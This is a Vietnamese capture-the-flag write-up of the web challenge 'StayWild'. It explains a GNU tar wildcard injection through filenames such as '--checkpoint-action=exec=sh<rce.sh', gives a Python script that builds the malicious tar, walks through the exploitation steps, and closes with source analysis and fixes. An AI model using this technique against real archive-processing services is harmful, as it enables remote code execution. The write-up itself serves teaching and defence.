---
title: "[Write-up] Omni CTF 2026 - Web: StayWild"
published: 2026-07-20
tags: [CTF, OmniCTF]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thi
draft: false
image: /assets/data/OmniCTF.png
author: M1nh7uan ft. Tr1nh x kanj3e
---

# StayWild

## 1. Challenge Overview

- **Target:** Web Application (Archive Upload / Extraction Service)
- **Challenge Name:** StayWild
- **Category:** Web
- **Vulnerability:** GNU tar Wildcard Injection
- **Final Impact:** Remote Code Execution via option-style filenames
- **Final Flag:** `omniCTF{w1ldc4rds_can_g3t_w1ld}`

### TL;DR / Attack Chain

```text
[Hidden /staging Archive Upload]
       │ (robots.txt hint)
       ▼
[Disabled UI but Real /additional/:id Endpoint]
       │ (chỉ bị disabled phía client)
       ▼
[Additional Tar Extracts Unchecked Filenames]
       │ (có thể tạo file bắt đầu bằng --)
       ▼
[Server Runs tar -xvf archive.tar *]
       │ (shell expand * thành filename do attacker kiểm soát)
       ▼
[GNU tar Checkpoint Option Injection] ──► RCE ──► Read flag
```

---

## 2. Reconnaissance & Vulnerability Analysis

### Background: Wildcard Characters in Shell

Trong Unix shell, ký tự `*` sẽ được shell expand thành danh sách file trong thư mục hiện tại.

Ví dụ, nếu thư mục có:

```text
a.txt
b.txt
c.txt
```

Thì lệnh:

```bash
echo *
```

sẽ tương đương với:

```bash
echo a.txt b.txt c.txt
```

Điểm nguy hiểm nằm ở chỗ command phía sau có thể coi các filename này như argument. Nếu attacker tạo được file có tên bắt đầu bằng `--`, shell vẫn expand bình thường, và chương trình có thể hiểu filename đó là option.

---

### GNU tar Wildcard Injection

GNU tar hỗ trợ checkpoint action:

```text
--checkpoint=N
--checkpoint-action=exec=CMD
```

Nếu attacker tạo được các file có tên:

```text
rce.sh
--checkpoint=1
--checkpoint-action=exec=sh<rce.sh
```

và server chạy command có glob `*` trong cùng thư mục:

```bash
tar -xvf archive.tar *
```

shell sẽ expand thành dạng:

```bash
tar -xvf archive.tar --checkpoint=1 --checkpoint-action=exec=sh<rce.sh rce.sh ...
```

Lúc này `tar` không còn xem các chuỗi `--checkpoint...` là filename nữa, mà xem chúng là option thật. Kết quả là command trong `rce.sh` được thực thi.

---

### Finding the Hidden Feature

Kiểm tra `/robots.txt` thấy hint:

```text
User-agent: *
# Field archive tooling is not ready for public indexing.
```

Hint này dẫn tới chức năng ẩn liên quan đến archive. Sau khi fuzz endpoint, tìm được trang `/staging`, là interface upload file `.tar`.

Trong source của trang có form upload bổ sung:

```html
<form
  action="/additional/1784490535624"
  method="POST"
  enctype="multipart/form-data"
>
  <input
    data-beta-upload
    class="is-disabled"
    type="file"
    name="file"
    id="files_1784490535624"
    multiple
    hidden
    disabled
    onchange="this.form.submit()"
  />
  <button
    data-beta-upload
    class="is-disabled"
    type="button"
    disabled
    onclick="document.getElementById('files_1784490535624').click()"
  >
    Upload additional files
    <span class="soon">Soon feature</span>
  </button>
</form>
```

UI hiển thị nút upload bị disabled, nhưng đây chỉ là kiểm soát phía client. Endpoint `/additional/:id` vẫn tồn tại và có thể POST trực tiếp.

---

### Understanding Server Behavior

Ban đầu mình thử hướng symlink attack, ví dụ đặt symlink trong tar trỏ tới `/etc/passwd` hoặc file nhạy cảm. Tuy nhiên ứng dụng không có chức năng download file, nên không có cách đọc lại nội dung symlink. Vì vậy hướng này bị loại.

Để hiểu cách server xử lý, upload:

- `abc.tar` làm initial archive, gồm các file `aaa`, `bbb`, `ccc`
- `def.tar` qua additional endpoint, gồm các file `ddd`, `eee`, `fff`

Response trả về:

```text
[extraction 1] initial archive pass
aaa
bbb
ccc

[extraction 2] additional extraction pass
aaa
bbb
ccc
tar: abc.tar: Not found in archive
tar: def.tar: Not found in archive
tar: Exiting with failure status due to previous errors

[additional archive: def.tar]
ddd
eee
fff
```

Phần `[extraction 2]` rất quan trọng. Nó liệt kê các file đang có trong workspace và `tar` cố gắng tìm `abc.tar`, `def.tar` như archive members.

Điều này gần như xác nhận server đang chạy command dạng:

```bash
tar -xvf abc.tar *
```

Trong đó `*` được shell expand thành toàn bộ filename trong workspace trước khi `tar` nhận lệnh.

---

## 3. Exploit Development

### Failed Initial Payload

Payload RCE được đóng gói vào `exp.tar` với các entry đặc biệt:

```python
import io
import tarfile

output_file = "exp.tar"

script_content = "cat /opt/wild/.cache/seed-574"

files = {
    "rce.sh": script_content.encode(),
    "--checkpoint=1": b"",
    "--checkpoint-action=exec=sh<rce.sh": b"",
}

with tarfile.open(output_file, "w") as tar:
    for filename, content in files.items():
        info = tarfile.TarInfo(filename)
        info.size = len(content)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(content))

print(f"Created: {output_file}")
```

Thử upload `exp.tar` làm initial archive thì bị chặn:

```text
The initial archive contains a blocked filename.
```

Lý do là initial upload có validate tar entry và chặn path component bắt đầu bằng `-`.

---

### Bypass via Additional Upload

Bypass nằm ở endpoint additional.

Initial upload kiểm tra nội dung bên trong tar, nhưng additional upload chỉ kiểm tra tên file upload bên ngoài. Nếu file upload tên là `exp.tar`, nó không chứa keyword bị chặn nên được chấp nhận.

Attack flow:

1. Upload `abc.tar` bình thường làm initial archive.
2. Upload `exp.tar` vào `/additional/:id`.
3. Server extract `exp.tar`, làm xuất hiện các file:

```text
rce.sh
--checkpoint=1
--checkpoint-action=exec=sh<rce.sh
```

4. Upload thêm một archive bất kỳ, ví dụ `def.tar`, để trigger lại additional extraction pass.
5. Server chạy:

```bash
tar -xvf abc.tar *
```

6. Shell expand `*` ra các filename độc hại, và `tar` thực thi:

```bash
--checkpoint-action=exec=sh<rce.sh
```

Kết quả là RCE.

---

## 4. Execution & Flag Extraction

### Final Payload Generator

Script tạo `exp.tar` đọc flag:

```python
import io
import tarfile

output_file = "exp.tar"
script_content = "cat /opt/wild/.cache/seed-574"

files = {
    "rce.sh": script_content.encode(),
    "--checkpoint=1": b"",
    "--checkpoint-action=exec=sh<rce.sh": b"",
}

with tarfile.open(output_file, "w") as tar:
    for filename, content in files.items():
        info = tarfile.TarInfo(filename)
        info.size = len(content)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(content))

print(f"Created: {output_file}")
```

---

### Exploitation Steps

1. Tạo archive bình thường `abc.tar`:

```text
aaa
bbb
ccc
```

2. Upload `abc.tar` tại `/staging`.
3. Lấy endpoint additional từ source HTML, dạng:

```text
/additional/<id>
```

4. POST trực tiếp `exp.tar` vào `/additional/<id>`.
5. POST tiếp một archive bất kỳ, ví dụ `def.tar`, để kích hoạt command `tar -xvf abc.tar *`.
6. Output trả về có dạng base64:

```text
b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==
```

Decode:

```bash
echo "b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==" | base64 -d
```

Flag:

```text
omniCTF{w1ldc4rds_can_g3t_w1ld}
```

---

## 5. Post-Solve Source Analysis

Sau khi solve, xem source thì thấy vulnerable command nằm trong `runAdditionalCommand`:

```javascript
function runAdditionalCommand(cwd, res, id, uploadedEntries) {
  const archiveName = getInitialArchiveName(cwd);
  runWithPty("tar -xvf " + shellQuote(archiveName) + " *", cwd, (output) => {
    extractAdditionalTarAttachments(cwd, uploadedEntries, (extraOutput) => {
      const logs = addLogEntry(
        id,
        "additional extraction pass",
        output + extraOutput,
      );
      const files = getWorkspaceFiles(cwd);
      res.send(resultPage(id, logs, files));
    });
  });
}
```

Lỗi nằm ở đoạn:

```javascript
"tar -xvf " + shellQuote(archiveName) + " *";
```

`archiveName` được quote, nhưng `*` lại được đưa vào shell command. Shell sẽ expand `*` thành danh sách file trong workspace, bao gồm các filename do attacker tạo ra.

Initial upload có validation khá chặt:

```javascript
if (normalized.split("/").some((part) => part.startsWith("-"))) {
  return "option-style filename";
}
```

Nhưng additional upload chỉ validate tên file upload bên ngoài:

```javascript
function blockedAdditionalReason(name) {
  const lower = String(name || "").toLowerCase();
  return (
    BLOCKED_ADDITIONAL_TOKENS.find((token) => lower.includes(token)) || null
  );
}
```

Vì `exp.tar` không chứa token bị chặn, archive được chấp nhận. Nội dung bên trong archive không được scan, nên các filename `--checkpoint...` được extract vào workspace.

---

## 6. Key Takeaways & Remediation

### Key Takeaways

1. **Wildcard expansion is dangerous with untrusted filenames.**  
   Chỉ cần attacker tạo được file bắt đầu bằng `--`, command có glob `*` có thể bị biến thành option injection.

2. **Client-side disabled is not security.**  
   Nút upload bị disabled trong UI không có ý nghĩa bảo mật nếu endpoint server vẫn nhận request.

3. **Validation must be consistent.**  
   Initial upload validate tar entries, nhưng additional upload lại không validate nội dung archive.

4. **Shell commands amplify small mistakes.**  
   Lỗi nằm ở một ký tự `*`, nhưng vì command chạy qua shell nên tác động trở thành RCE.

---

### Recommended Fixes

- Không dùng shell để gọi `tar`; nên dùng `spawn` / `execFile` với argv array.
- Không append `*` trực tiếp vào shell command.
- Validate tất cả tar entries ở mọi upload flow, bao gồm initial và additional.
- Reject mọi path component bắt đầu bằng `-`.
- Extract archive trong thư mục riêng, mỗi request một workspace sạch.
- Chặn path traversal, symlink abuse và hardlink abuse khi extract.
- Dùng quyền user thấp nhất có thể cho process extract archive.
- Không đưa endpoint beta/disabled lên production nếu server-side chưa kiểm soát đầy đủ.

---

## 7. Conclusion

StayWild bị khai thác thông qua GNU tar wildcard injection. Root cause là server chạy `tar -xvf archive.tar *` trong workspace có filename do user kiểm soát.

Initial upload có chặn filename nguy hiểm, nhưng additional upload không validate nội dung archive. Attacker có thể đặt các file `--checkpoint=1` và `--checkpoint-action=exec=sh<rce.sh` vào workspace, sau đó trigger lại extraction pass để shell expand `*` và biến các filename này thành option của GNU tar.

Kết quả cuối cùng là RCE và đọc được flag:

```text
omniCTF{w1ldc4rds_can_g3t_w1ld}
```
